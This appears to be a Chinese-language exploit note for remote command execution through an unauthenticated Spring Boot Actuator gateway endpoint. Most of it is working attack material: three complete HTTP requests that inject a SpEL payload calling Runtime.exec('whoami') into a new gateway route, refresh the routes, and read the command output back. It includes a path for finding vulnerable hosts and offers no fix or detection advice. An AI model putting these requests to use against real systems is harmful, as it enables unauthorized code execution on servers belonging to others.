# Spring boot gateway存在命令执行漏洞

# 一、漏洞描述
Spring boot gateway存在命令执行漏洞

# 二、影响版本
Spring boot actuator未授权

# 三、资产测绘
```plain
/actuator/gateway/  接口存在
```

![1730259600146-25661149-dd5e-4032-9a0c-1c1c822d05be.png](./img/N0O-b9s0Otwvz0JD/1730259600146-25661149-dd5e-4032-9a0c-1c1c822d05be-729423.png)

# 三、漏洞复现
1. <font style="color:rgba(0, 0, 0, 0.9);">构造poc1创建hacker文件：</font>

```plain
POST /actuator/gateway/routes/jeecg-demo HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 333

{
  "id": "/jeecg-demo",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

```

![1730259826668-97743867-3d03-439c-9fd3-431b8ae57efd.png](./img/N0O-b9s0Otwvz0JD/1730259826668-97743867-3d03-439c-9fd3-431b8ae57efd-354366.png)

2、刷新路由

```plain
POST /actuator/gateway/refresh HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: __51uvsct__JuHMLCp1r3cB6ggB=1; __51vcke__JuHMLCp1r3cB6ggB=8bfe73d5-e527-5232-9cbe-1f2983c556d9; __51vuft__JuHMLCp1r3cB6ggB=1681223932313
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

![1730259859862-7d54ce26-aedd-4fe3-be7f-158cb5062a3e.png](./img/N0O-b9s0Otwvz0JD/1730259859862-7d54ce26-aedd-4fe3-be7f-158cb5062a3e-429367.png)

3、查看回显

```plain
GET /actuator/gateway/routes/jeecg-demo HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

![1730259885785-61015288-0875-478c-b1c5-3b7b5f2c405b.png](./img/N0O-b9s0Otwvz0JD/1730259885785-61015288-0875-478c-b1c5-3b7b5f2c405b-981370.png)



> 更新: 2024-11-27 10:04:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gl2g116gzest4e6t>